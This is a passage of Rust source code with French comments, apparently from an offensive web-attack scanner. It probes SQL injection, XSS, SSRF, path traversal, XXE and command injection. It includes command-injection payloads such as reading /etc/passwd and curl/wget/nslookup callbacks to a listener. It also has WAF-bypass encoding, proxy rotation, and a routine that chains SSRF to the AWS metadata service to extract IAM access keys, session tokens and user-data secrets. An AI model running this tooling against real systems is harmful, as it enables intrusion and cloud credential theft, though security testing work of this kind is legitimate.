            format!(r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{}/">%xxe;]><foo>test</foo>"#, name),
            String::new(),
        ));
    }
    // Payloads externes (fichier `--web-payloads xxe=…`).
    payloads.extend(ext.xxe.iter().cloned());
    payloads
}

/// Payloads d'injection de commande embarqués + OOB, complétés par les
/// payloads externes (`ext.cmdi`).
fn cmd_injection_payloads(
    callback: Option<&str>,
    token: &str,
    ext: &ExternalPayloads,
) -> Vec<(String, String)> {
    let mut payloads: Vec<(String, String)> = vec![
        ("; id", "uid="),
        ("| id", "uid="),
        ("& id", "uid="),
        ("&& id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; sleep 2", ""), // time-based
        ("| sleep 2", ""),
        ("; whoami", "root|www-data|apache"),
        ("; cat /etc/passwd", "root:x:0:0"),
        ("\n/usr/bin/id\n", "uid="),
        ("'; echo vulnerable;'", "vulnerable"),
        // Windows
        ("& whoami", "nt authority|system|administrator"),
        ("| dir", "directory"),
        ("&& net user", "user accounts"),
    ]
    .into_iter()
    .map(|(p, e)| (p.to_string(), e.to_string()))
    .collect();
    // OOB — command injection aveugle : faire rappeler l'écouteur par la cible.
    if let Some(cb) = callback {
        let cb = cb.trim_end_matches('/');
        if !cb.is_empty() && !token.is_empty() {
            let url = format!("{}/{}", cb, token);
            payloads.push((format!("; curl -s {}", url), String::new()));
            payloads.push((format!("| curl -s {}", url), String::new()));
            payloads.push((format!("; wget -q -O- {}", url), String::new()));
        }
    }
    // OOB DNS — exfiltration par résolution (nslookup/ping), très souvent autorisée
    // là où les sorties HTTP sont filtrées.
    if let Some(name) = crate::oob::OobListener::dns_name(token) {
        payloads.push((format!("; nslookup {}", name), String::new()));
        payloads.push((format!("| nslookup {}", name), String::new()));
        payloads.push((format!("; ping -c 1 {}", name), String::new()));
        payloads.push((format!("& nslookup {}", name), String::new())); // Windows
    }
    // Payloads externes (fichier `--web-payloads cmdi=…`).
    payloads.extend(ext.cmdi.iter().cloned());
    payloads
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. SQL Injection Scanner
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_sqli(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — chaque paramètre est testé en parallèle (concurrence bornée).
    // L'ordre des payloads reste séquentiel à l'intérieur d'un paramètre, ce qui
    // préserve la sémantique « premier hit trouvé » (break).
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().copied())
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_sqli_param(&client, base_url, param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre avec toute la liste de payloads SQLi (GET puis POST),
/// bascule sur un encodage tamper si un WAF bloque, et confirme les
/// détections time-based avant de les retenir.
async fn probe_sqli_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns: Vec<WebVuln> = Vec::new();

    // ── Baseline : body/len/timing sans injection (req sans param)
    let baseline = fetch_baseline(client, base_url).await;
    let baseline_has_sql_error = match &baseline {
        Some((body, _, _)) => contains_strict_sqli_error(&body.to_lowercase()),
        None => false,
    };

    // ── Chantier 2a — contexte d'injection SQL.
    // Une sonde minimale (`'`, `"`, `')`, `")`, `'-- `) déduit le guillemet, la
    // parenthèse et le SGBD réels ; les payloads sont ensuite *générés* pour ce
    // contexte et essayés en premier, au lieu de 17 variantes aveugles.
    let mut payloads: Vec<(String, String)> = Vec::new();
    if !baseline_has_sql_error {
        if let Some(ctx) = detect_sqli_context(client, base_url, param, cfg).await {
            println!(
                "  \x1b[36m[SQLi ctx]\x1b[0m {} param={} quote={} paren={} dbms={}",
                base_url,
                param,
                ctx.quote,
                ctx.paren,
                ctx.dbms.unwrap_or("?")
            );
            payloads.extend(
                sqli_context_payloads(&ctx)
                    .into_iter()
                    .map(|(p, e)| (p, e.to_string())),
            );
        }
    }
    payloads.extend(sqli_payloads(&cfg.external));

    for (payload, evidence_pattern) in payloads.iter().map(|(p, e)| (p.as_str(), e.as_str())) {
        let mut blocked = false;

        // OPSEC/robustesse : JAMAIS de retry sur une sonde time-based. Un second
        // envoi fausserait la mesure de latence (et la confirmation P0.3 qui
        // suit) : `attempts = 1` ⇒ un seul tir, temps mesuré une seule fois.
        let attempts = if is_time_based_payload(payload) {
            1
        } else {
            cfg.retries
        };

        // Test GET (P1.1 : retry sur erreur réseau transitoire)
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
        if let Some((status, body, elapsed)) = http_get(client, &test_url, attempts).await {
            blocked = is_waf_blocked(status, &body);

            if let Some(v) = detect_sqli_response_checked(
                &body,
                status,
                elapsed,
                payload,
                evidence_pattern,
                &test_url,
                param,
                &baseline,
                baseline_has_sql_error,
            ) {
                // P0.3 — confirmation : un seul délai anormal n'est pas une preuve.
                if v.vuln_type.contains("Time-Based")
                    && !confirm_time_based(client, base_url, param, payload, 3, 1800).await
                {
                    println!(
                        "  \x1b[33m[SQLi]\x1b[0m Time-based rejeté (non reproductible) {} param={}",
                        base_url, param
                    );
                } else {
                    println_payload_log("SQLi", &test_url, param, payload, &v.evidence);
                    vulns.push(v);
                    break;
                }
            }
        }

        // Test POST (P1.1)
        if let Some((status, body, elapsed)) =
            http_post_form(client, base_url, &[(param, payload)], attempts).await
        {
            blocked = blocked || is_waf_blocked(status, &body);

            if let Some(mut v) = detect_sqli_response_checked(
                &body,
                status,
                elapsed,
                payload,
                evidence_pattern,
                base_url,
                param,
                &baseline,
                baseline_has_sql_error,
            ) {
                v.parameter = format!("POST:{}", param);
                println_payload_log("SQLi POST", base_url, param, payload, &v.evidence);
                vulns.push(v);
                break;
            }
        }

        // P0.2 — la requête brute a été filtrée : rejouer des encodages alternatifs
        // avant d'abandonner ce payload.
        if blocked && cfg.waf_bypass {
            if let Some(v) = probe_tampered(
                client,
                base_url,
                param,
                payload,
                evidence_pattern,
                &baseline,
                baseline_has_sql_error,
                attempts,
            )
            .await
            {
                vulns.push(v);
                break;
            }
        }
    }

    vulns
}

fn detect_sqli_response(
    body: &str,
    status: u16,
    elapsed_ms: u128,
    payload: &str,
    evidence: &str,
    url: &str,
    param: &str,
) -> Option<WebVuln> {
    detect_sqli_response_checked(
        body, status, elapsed_ms, payload, evidence, url, param, &None, false,
    )
}

fn contains_strict_sqli_error(body_lower: &str) -> bool {
    // SEULEMENT des chaînes typiques d'erreurs SQL brutes — jamais "error" ni "syntax"
    // seuls, car ils apparaissent dans du HTML lambda (Drupal, forms, etc.)
    let sqli_errors: &[&str] = &[
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql server version for the right syntax",
        "check the manual that corresponds to your mysql server",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "pg_query()",
        "pg_exec()",
        "syntax error at or near",
        "ora-01756",
        "ora-00933",
        "ora-00904",
        "sqlite_exception",
        "sqlite3.OperationalError",
        "sqlite3.ProgrammingError",
        "microsoft oledb provider for sql server",
        "odbc sql server driver",
        "supplied argument is not a valid mysql",
        "sqlstate",
        "mysql_fetch_assoc()",
        "mysql_fetch_array()",
        "pg_query_params()",
        "invalid input syntax for integer",
    ];
    for &err in sqli_errors {
        if body_lower.contains(err) {
            return true;
        }
    }
    false
}

async fn fetch_baseline(client: &reqwest::Client, url: &str) -> Option<(String, u16, u128)> {
    // Fetch la baseline (requête normale sans injection) pour comparaison ultérieure.
    // Retourne (body_lowercase, status, elapsed_ms).
    let start = std::time::Instant::now();
    match client.get(url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = read_body_bounded(resp).await;
            let elapsed = start.elapsed().as_millis();
            Some((body, status, elapsed))
        }
        Err(_) => None,
    }
}

#[inline]
fn println_payload_log(tag: &str, url: &str, param: &str, payload: &str, evidence: &str) {
    // Affiche le payload échappé/tronqué — résout l'affichage ambigu payload='
    let mut escaped = String::with_capacity(payload.len() + 4);
    for ch in payload.chars() {
        match ch {
            '\'' => escaped.push_str("\\'"),
            '\"' => escaped.push_str("\\\""),
            '\n' => escaped.push_str("\\n"),
            '\r' => escaped.push_str("\\r"),
            '\t' => escaped.push_str("\\t"),
            c if (c as u32) < 0x20 => escaped.push('�'),
            c => escaped.push(c),
        }
    }
    // Troncature sûre : `String::truncate` panique si l'index tombe au milieu
    // d'un caractère multi-octets (les contrôles ci-dessus insèrent U+FFFD).
    let escaped = if escaped.chars().count() > 80 {
        format!("{}…", escaped.chars().take(80).collect::<String>())
    } else {
        escaped
    };
    println!(
        "  \x1b[38;5;196m[{tag}]\x1b[0m {url}  param={param}  payload='{esc}'  :: {evid:.160}",
        tag = tag,
        url = url,
        param = param,
        esc = escaped,
        evid = evidence,
    );
}

/// Reconnaît les payloads de délai : `SLEEP`, `pg_sleep`, `WAITFOR DELAY`,
/// `dbms_pipe.receive_message`. Insensible à la casse — les primitives
/// contextuelles sont générées en minuscules pour PostgreSQL (`pg_sleep`).
fn is_time_based_payload(payload: &str) -> bool {
    let p = payload.to_lowercase();
    p.contains("sleep") || p.contains("waitfor") || p.contains("receive_message")
}

fn detect_sqli_response_checked(
    body: &str,
    status: u16,
    elapsed_ms: u128,
    payload: &str,
    evidence: &str,
    url: &str,
    param: &str,
    baseline: &Option<(String, u16, u128)>,
    baseline_has_sql_error: bool,
) -> Option<WebVuln> {
    let body_lower = body.to_lowercase();

    // ── Filtre anti-faux positif : pages WAF / blocage / auth
    //    401/403/407/429 ne sont JAMAIS des preuves d'injection SQL.
    //    Une page 4xx générique (sauf 404 sur payload idiosyncratique) est exclue de la détection
    //    evidence-based faible (HIGH).
    let is_waf_or_block = matches!(status, 401 | 403 | 407 | 429);
    let is_4xx = (400..=499).contains(&status);
    let is_5xx = (500..=599).contains(&status);
    let baseline_status = baseline.as_ref().map(|(_, s, _)| *s).unwrap_or(0);

    // ── Error-based SQLi (strict) : pattern d'erreur SQL verbeux + pas dans baseline
    //    On tolère un 500 ici (une erreur SQL non catchée renvoie 500), mais JAMAIS un WAF 403.
    if !is_waf_or_block
        && (status < 400 || is_5xx)
        && contains_strict_sqli_error(&body_lower)
        && !baseline_has_sql_error
    {
        let snippet = body_lower
            .split('\n')
            .find(|l| contains_strict_sqli_error(l))
            .unwrap_or(&body_lower)
            .chars()
            .take(140)
            .collect::<String>();
        return Some(WebVuln {
            vuln_type:   "SQL Injection (Error-Based)".into(),
            url:         url.to_string(),
            parameter:   param.to_string(),
            payload:     payload.to_string(),
            evidence:    format!("Erreur SQL détectée (pas dans baseline): \"{}\"", snippet),
            severity:    "CRITICAL".into(),
            confidence:  0.95,
            remediation: "Utiliser des requêtes préparées (parameterized queries). Ne jamais concaténer des entrées utilisateur dans des requêtes SQL.".into(),
        });
    }

    // ── Time-based blind SQLi (SLEEP/WAITFOR/pg_sleep/dbms_pipe)
    if !is_waf_or_block && is_time_based_payload(payload) && elapsed_ms >= 1800 {
        let baseline_ok = baseline.as_ref().map(|(_, _, t)| *t < 900).unwrap_or(true);
        if baseline_ok {
            return Some(WebVuln {
                vuln_type: "SQL Injection (Time-Based Blind)".into(),
                url: url.to_string(),
                parameter: param.to_string(),
                payload: payload.to_string(),
                evidence: format!(
                    "Délai de réponse anormal: {}ms (baseline < 900ms)",
                    elapsed_ms
                ),
                severity: "CRITICAL".into(),
                confidence: 0.85,
                remediation: "Utiliser des requêtes préparées. Auditer tout le code SQL.".into(),
            });
        }
    }

    // ── Evidence/Pattern matching (UNION SELECT, NULL,NULL, etc.) — niveau HIGH
    //    Filtre IMPÉRATIF : nécessite une réponse 2xx OU un delta de statut vs baseline clair.
    //    Toute réponse WAF (403/429) ou page d'erreur 4xx générique est exclue.
    if !evidence.is_empty() && !is_waf_or_block {
        let eligible = status < 400
            || (is_5xx && baseline_status < 400)
            || (is_4xx && !matches!(status, 400 | 404));
        if eligible {
            for raw_pattern in evidence.split('|') {
                let pat = raw_pattern.trim();
                if pat.is_empty() {
                    continue;
                }
                let pat_lower = pat.to_lowercase();
                let in_body = body_lower.contains(&pat_lower);
                let in_baseline = baseline
                    .as_ref()
                    .map(|(b, _, _)| b.to_lowercase().contains(&pat_lower))
                    .unwrap_or(false);
                if in_body && !in_baseline {
                    return Some(WebVuln {
                        vuln_type: "SQL Injection".into(),
                        url: url.to_string(),
                        parameter: param.to_string(),
                        payload: payload.to_string(),
                        evidence: format!(
                            "Pattern SQL '{}' apparu uniquement dans réponse injectée",
                            pat
                        ),
                        severity: "HIGH".into(),
                        confidence: 0.78,
                        remediation: "Utiliser des requêtes préparées.".into(),
                    });
                }
            }
        }
    }

    None
}

fn dedup_vulns(vulns: Vec<WebVuln>) -> Vec<WebVuln> {
    use std::collections::HashSet;
    let mut seen: HashSet<(String, String, String)> = HashSet::new();
    let mut out = Vec::with_capacity(vulns.len());
    for v in vulns {
        let key = (v.vuln_type.clone(), v.url.clone(), v.parameter.clone());
        if !seen.contains(&key) {
            seen.insert(key);
            out.push(v);
        }
    }
    out
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. XSS Scanner
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_xss(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée (ordre non garanti).
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_xss_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre (XSS réfléchi + DOM) et rejoue un encodage tamper si WAF.
async fn probe_xss_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    // ── Chantier 2b — contexte de réflexion.
    // Un marqueur unique est injecté pour savoir si le paramètre atterrit dans
    // du texte HTML, une valeur d'attribut ou un bloc `<script>`. Les payloads
    // sont ensuite générés pour ce contexte précis.
    let marker = format!(
        "nrtg{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos()
    );
    let marker_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&marker));
    let mut generated: Vec<String> = Vec::new();
    if let Some((_, body, _)) = http_get(client, &marker_url, cfg.retries).await {
        let ctx = classify_xss_context(&body, &marker);
        if ctx != XssContext::NotFound {
            println!(
                "  \x1b[36m[XSS ctx]\x1b[0m {} param={} contexte={:?}",
                base_url, param, ctx
            );
            generated = xss_context_payloads(ctx, &marker);
        }
    }
    let ctx_payloads: Vec<&str> = generated.iter().map(|s| s.as_str()).collect();

    // Référence sans injection. Si le payload apparaît déjà dans la réponse
    // naturelle de la page (script tiers, documentation, exemple de code…),
    // sa présence après injection ne prouve aucune réflexion : sans cette
    // mesure, toute page contenant déjà `<script>` déclenchait une XSS.
    let baseline_body = match http_get(client, base_url, cfg.retries).await {
        Some((_, b, _)) => b,
        None => String::new(),
    };

    let builtin_xss = xss_payloads(&cfg.external);
    for payload in ctx_payloads
        .iter()
        .copied()
        .chain(builtin_xss.iter().map(|s| s.as_str()))
    {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));

        if let Some((status, body, _)) = http_get(client, &test_url, cfg.retries).await {
            // XSS réfléchi : le payload apparaît tel quel (donc non encodé) ET
            // n'était pas déjà présent dans la page avant injection. Aucune
            // condition indépendante du payload (`<script>alert`…) : ce serait
            // un faux positif garanti sur toute page embarquant un script.
            if body.contains(payload) && !baseline_body.contains(payload) {
                println!("  \x1b[38;5;196m[XSS]\x1b[0m {} param={}", base_url, param);
                vulns.push(WebVuln {
                    vuln_type:   "Cross-Site Scripting (Reflected XSS)".into(),
                    url:         test_url.clone(),
                    parameter:   param.to_string(),
                    payload:     payload.to_string(),
                    evidence:    format!("Payload '{:.60}' réfléchi dans la réponse sans encodage", payload),
                    severity:    "HIGH".into(),
                    confidence:  0.90,
                    remediation: "Encoder les sorties HTML (htmlspecialchars/HtmlEncoder). Implémenter une Content Security Policy (CSP).".into(),
                });
                break;
            }

            // DOM XSS — chercher le payload dans les scripts JavaScript
            if body.contains("document.write(")
                || body.contains("innerHTML")
                || body.contains("eval(")
            {
                if body.contains(param) {
                    vulns.push(WebVuln {
                        vuln_type:   "Cross-Site Scripting (DOM-Based XSS)".into(),
                        url:         test_url.clone(),
                        parameter:   param.to_string(),
                        payload:     payload.to_string(),
                        evidence:    "Paramètre reflété dans un sink DOM dangereux (document.write/innerHTML/eval)".into(),
                        severity:    "HIGH".into(),
                        confidence:  0.70,
                        remediation: "Éviter document.write/innerHTML. Utiliser textContent. Implémenter une CSP stricte.".into(),
                    });
                    break;
                }
            }

            // P0.2 — réponse filtrée par un WAF : retenter en encodage alternatif
            if cfg.waf_bypass && is_waf_blocked(status, &body) {
                if let Some(ev) =
                    tamper_retry(client, base_url, param, payload, cfg.retries, |b, _| {
                        // Mêmes garanties qu'en direct : réflexion du payload
                        // réellement injecté, absente de la page de référence.
                        if b.contains(payload) && !baseline_body.contains(payload) {
                            Some(format!("Payload '{:.60}' réfléchi après tamper", payload))
                        } else {
                            None
                        }
                    })
                    .await
                {
                    println!(
                        "  \x1b[38;5;196m[XSS]\x1b[0m {} param={} (WAF bypass)",
                        base_url, param
                    );
                    vulns.push(WebVuln {
                        vuln_type:   "Cross-Site Scripting (Reflected XSS)".into(),
                        url:         test_url.clone(),
                        parameter:   param.to_string(),
                        payload:     payload.to_string(),
                        evidence:    ev,
                        severity:    "HIGH".into(),
                        confidence:  0.80,
                        remediation: "Encoder les sorties HTML (htmlspecialchars/HtmlEncoder). Implémenter une Content Security Policy (CSP).".into(),
                    });
                    break;
                }
            }
        }
    }

    vulns
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. SSRF Scanner
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_ssrf(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée.
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_ssrf_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre pour SSRF (GET) et rejoue un encodage tamper si WAF.
async fn probe_ssrf_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    // Token unique pour ce paramètre — sert à confirmer un SSRF aveugle via l'écouteur OOB.
    let token = oob_token(cfg);
    let payloads = ssrf_payloads(cfg.ssrf_callback.as_deref(), &token, &cfg.external);

    for (payload, evidence) in &payloads {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));

        if let Some((status, body, _)) = http_get(client, &test_url, cfg.retries).await {
            let body_lower = body.to_lowercase();

            // Vérifier les patterns d'évidence
            let found = if !evidence.is_empty() {
                evidence.split('|').any(|e| body_lower.contains(e))
            } else {
                // SSRF générique — réponse interne détectée
                status == 200
                    && (body_lower.contains("ec2")
                        || body_lower.contains("metadata")
                        || body_lower.contains("ami-id"))
            };

            if found {
                println!(
                    "  \x1b[38;5;196m[SSRF]\x1b[0m {} param={} → {}",
                    base_url, param, payload
                );
                vulns.push(WebVuln {
                    vuln_type:   "Server-Side Request Forgery (SSRF)".into(),
                    url:         test_url,
                    parameter:   param.to_string(),
                    payload:     payload.to_string(),
                    evidence:    format!("Accès interne confirmé via '{}': réponse contient '{}'",
                        payload, evidence.split('|').next().unwrap_or(evidence.as_str())),
                    severity:    if payload.contains("169.254") { "CRITICAL" } else { "HIGH" }.into(),
                    confidence:  0.90,
                    remediation: "Valider/whitelister les URLs. Bloquer les accès aux plages IP internes (RFC 1918, 169.254.x.x). Utiliser un proxy sortant avec allowlist.".into(),
                });
                break;
            }

            // P0.2 — payload filtré : retenter avec un encodage alternatif
            if cfg.waf_bypass && is_waf_blocked(status, &body) {
                if let Some(ev) =
                    tamper_retry(client, base_url, param, payload, cfg.retries, |b, _| {
                        let bl = b.to_lowercase();
                        evidence
                            .split('|')
                            .find(|e| !e.is_empty() && bl.contains(e))
                            .map(|m| format!("Accès interne confirmé après tamper : '{}'", m))
                    })
                    .await
                {
                    println!(
                        "  \x1b[38;5;196m[SSRF]\x1b[0m {} param={} → {} (WAF bypass)",
                        base_url, param, payload
                    );
                    vulns.push(WebVuln {
                        vuln_type:   "Server-Side Request Forgery (SSRF)".into(),
                        url:         test_url.clone(),
                        parameter:   param.to_string(),
                        payload:     payload.to_string(),
                        evidence:    ev,
                        severity:    if payload.contains("169.254") { "CRITICAL" } else { "HIGH" }.into(),
                        confidence:  0.75,
                        remediation: "Valider/whitelister les URLs. Bloquer les accès aux plages IP internes (RFC 1918, 169.254.x.x). Utiliser un proxy sortant avec allowlist.".into(),
                    });
                    break;
                }
            }
        }
    }

    // OOB — SSRF aveugle : si aucun signe direct mais que l'écouteur a reçu le
    // token, c'est une preuve forte d'exécution de la requête côté serveur.
    if vulns.is_empty() && !token.is_empty() && crate::oob::OobListener::hit(&token) {
        println!(
            "  \x1b[38;5;196m[SSRF OOB]\x1b[0m {} param={} → callback reçu",
            base_url, param
        );
        vulns.push(WebVuln {
            vuln_type:   "Server-Side Request Forgery (SSRF, aveugle)".into(),
            url:         base_url.to_string(),
            parameter:   param.to_string(),
            payload:     format!("{} (OOB token)", cfg.ssrf_callback.as_deref().unwrap_or("")),
            evidence:    "Callback OOB reçu sur l'écouteur intégré — SSRF aveugle confirmé".into(),
            severity:    "HIGH".into(),
            confidence:  0.99,
            remediation: "Valider/whitelister les URLs. Bloquer les accès aux plages IP internes (RFC 1918, 169.254.x.x). Utiliser un proxy sortant avec allowlist.".into(),
        });
    }

    vulns
}

// ── Chaînage d'exploitation : SSRF → métadonnées cloud ─────────────────────

/// Une fois un SSRF confirmé sur `param`, exploite la primitive pour lire les
/// métadonnées d'instance et en extraire des credentials.
///
/// AWS IMDSv1 est le seul service joignable **sans en-tête spécifique** — donc
/// le seul chaînable depuis un paramètre GET. GCP et Azure exigent
/// `Metadata-Flavor` / `Metadata`, non injectables ici.
pub async fn chain_ssrf_metadata(
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<CloudSecret> {
    const IMDS: &str = "http://169.254.169.254/latest";

    let client = build_client(cfg);

    // Récupère une ressource IMDS *à travers* la cible vulnérable.
    async fn fetch_inner(
        client: &Client,
        base_url: &str,
        param: &str,
        inner: &str,
        retries: usize,
    ) -> Option<String> {
        let url = format!("{}?{}={}", base_url, param, urlencoding::encode(inner));
        http_get(client, &url, retries)
            .await
            .map(|(_, body, _)| body)
    }

    let mut secrets: Vec<CloudSecret> = Vec::new();

    // 1. Liste des rôles IAM attachés à l'instance.
    let roles_url = format!("{}/meta-data/iam/security-credentials/", IMDS);
    let Some(roles_body) = fetch_inner(&client, base_url, param, &roles_url, cfg.retries).await
    else {
        return secrets;
    };
    let roles: Vec<String> = roles_body
        .lines()
        .map(|l| l.trim())
        .filter(|l| is_aws_role_name(l))
        .take(3)
        .map(|s| s.to_string())
        .collect();
    if roles.is_empty() {
        // Pas de rôle lisible : tenter quand même user-data (secrets en clair).
        if let Some(ud) = fetch_inner(
            &client,
            base_url,
            param,
            &format!("{}/user-data", IMDS),
            cfg.retries,
        )
        .await
        {
            secrets.extend(scan_text_for_cloud_secrets(
                &ud,
                &format!("{}/user-data", IMDS),
            ));
        }
        return secrets;
    }

    // 2. Credentials temporaires de chaque rôle (JSON IMDSv1).
    for role in &roles {
        let cred_url = format!("{}/meta-data/iam/security-credentials/{}", IMDS, role);
        let Some(body) = fetch_inner(&client, base_url, param, &cred_url, cfg.retries).await else {
            continue;
        };
        let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) else {
            secrets.extend(scan_text_for_cloud_secrets(&body, &cred_url));
            continue;
        };
        for (json_key, kind) in [
            ("AccessKeyId", "aws_access_key_id"),
            ("SecretAccessKey", "aws_secret_access_key"),
            ("Token", "aws_session_token"),
        ] {
            if let Some(value) = json.get(json_key).and_then(|v| v.as_str()) {
                if !value.is_empty() {
                    secrets.push(CloudSecret {
                        provider: "aws".into(),
                        kind: kind.into(),
                        value: value.to_string(),
                        source: cred_url.clone(),
                    });
                }
            }
        }
    }

    // 3. user-data : recense les secrets laissés en clair au boot.
    if let Some(ud) = fetch_inner(
        &client,
        base_url,
        param,
        &format!("{}/user-data", IMDS),
        cfg.retries,
    )
    .await
    {
        secrets.extend(scan_text_for_cloud_secrets(
            &ud,
            &format!("{}/user-data", IMDS),
        ));
    }

    if !secrets.is_empty() {
        println!(
            "  \x1b[38;5;196m[SSRF→IMDS]\x1b[0m {} param={} → {} secret(s) extrait(s) (rôles: {})",
            base_url,
            param,
            secrets.len(),
            roles.join(", ")
        );
        for s in &secrets {
            // OPSEC : jamais de valeur en clair dans la sortie opérateur.
            println!(
                "     • {} {} = {}*** [{}]",
                s.provider,
                s.kind,
                s.value.chars().take(4).collect::<String>(),
                s.source
            );
        }
    }

    secrets
}

/// Un nom de rôle IAM est alphanumérique (`+=,.@-_`) et court ; ce filtre
/// écarte les pages d'erreur HTML renvoyées par un SSRF non exploitable.
fn is_aws_role_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && !s.contains(' ')
        && !s.contains('<')
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "+=,.@-_".contains(c))
}

/// Extrait les secrets lisibles en clair d'un texte libre (user-data, page
/// d'erreur) : clé d'accès AWS et affectations `password=`/`token=`/…
fn scan_text_for_cloud_secrets(text: &str, source: &str) -> Vec<CloudSecret> {
    /// Longueur d'une clé d'accès AWS (`AKIA` + 16 caractères).
    const AWS_KEY_LEN: usize = 20;
    let mut out = Vec::new();

    for (idx, raw_line) in text.lines().enumerate() {
        let line = raw_line.trim();
        // Les indices d'octets ne sont réutilisables que sur de l'ASCII :
        // `to_ascii_lowercase` conserve la longueur, contrairement à
        // `to_lowercase` (qui peut changer le nombre d'octets).
        if !line.is_ascii() {
            continue;
        }
        let lower = line.to_ascii_lowercase();
        let at = format!("{}#L{}", source, idx + 1);

        // Clé d'accès AWS en clair : `AKIA` suivi de 16 majuscules/chiffres.
        if let Some(pos) = line.find("AKIA") {
            let candidate: Vec<char> = line[pos..].chars().take(AWS_KEY_LEN).collect();
            if candidate.len() == AWS_KEY_LEN
                && candidate[4..]
                    .iter()
                    .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
            {
                out.push(CloudSecret {
                    provider: "aws".into(),
                    kind: "aws_access_key_id".into(),
                    value: candidate.into_iter().collect(),
                    source: at.clone(),
                });
            }
        }

        // Affectations `mot-de-passe=valeur` / `token=valeur` / …
        for marker in [
            "password=",
            "passwd=",
            "secret=",
            "token=",
            "aws_secret_access_key",
        ] {
            if let Some(pos) = lower.find(marker) {
                let value = line[pos + marker.len()..]
                    .trim()
                    .trim_matches(&['"', '\''][..])
                    .to_string();
                if value.chars().count() >= 6 {
                    out.push(CloudSecret {
                        provider: "aws".into(),
                        kind: marker.trim_end_matches('=').to_string(),
                        value,
                        source: at.clone(),
                    });
                    break;
                }
            }
        }
    }
    out
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. Path Traversal / LFI
// ─────────────────────────────────────────────────────────────────────────────

pub async fn scan_path_traversal(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // P0.1 — un paramètre par tâche, concurrence bornée.
    // P1.3 — un client par tâche ⇒ rotation de proxy (IP distincte par paramètre).
    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move { probe_lfi_param(&client, base_url, &param, cfg).await }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

/// Teste un paramètre pour Path Traversal/LFI et rejoue un tamper si WAF.
async fn probe_lfi_param(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    let mut vulns = Vec::new();

    for (payload, evidence) in path_traversal_payloads(&cfg.external) {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(&payload));

        if let Some((status, body, _)) = http_get(client, &test_url, cfg.retries).await {
            let mut hit = None;
            for pattern in evidence.split('|') {
                if body.contains(pattern) {
                    hit = Some(pattern.to_string());
                    break;
                }
            }

            if let Some(pattern) = hit {
                println!(
                    "  \x1b[38;5;196m[LFI]\x1b[0m {} param={} → {}",
                    base_url, param, payload
                );
                vulns.push(WebVuln {
                    vuln_type:   "Path Traversal / Local File Inclusion (LFI)".into(),
                    url:         test_url.clone(),
                    parameter:   param.to_string(),
                    payload:     payload.to_string(),
                    evidence:    format!("Fichier système lu : pattern '{}' trouvé", pattern),
                    severity:    if body.contains("root:x:0:0") { "CRITICAL" } else { "HIGH" }.into(),
                    confidence:  0.95,
